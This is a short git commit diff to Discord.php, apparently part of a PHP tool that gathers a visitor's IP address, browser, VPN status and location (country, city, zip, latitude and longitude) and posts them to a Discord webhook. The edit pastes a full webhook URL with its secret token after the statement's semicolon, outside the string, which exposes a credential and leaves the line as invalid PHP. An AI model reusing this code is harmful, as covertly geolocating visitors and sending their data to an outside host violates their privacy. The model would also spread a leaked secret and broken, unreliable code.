3adb7e4d18678c6a584f20f75c22c9540c7051f8
giorgos123K <giorgiorellis@gmail.com>
2024-07-22 17:25:15 +0300

    Update Discord.php

--- Discord.php
+++ Discord.php
@@ -56,7 +56,7 @@ class Discord
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
 		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
-        $Webhook = "FULLURLHERE";
+        $Webhook = "FULLURLHERE";https://discord.com/api/webhooks/1264678593968210061/a-aQ5XYvZ0YjpkPIvuXPjOsCQUlcgAxtwm9nTLBz0shy2xIjIy5G4g_9vKh7s_9fUtpa
 
         $InfoArr = array(
             "username" => "$WebhookName",
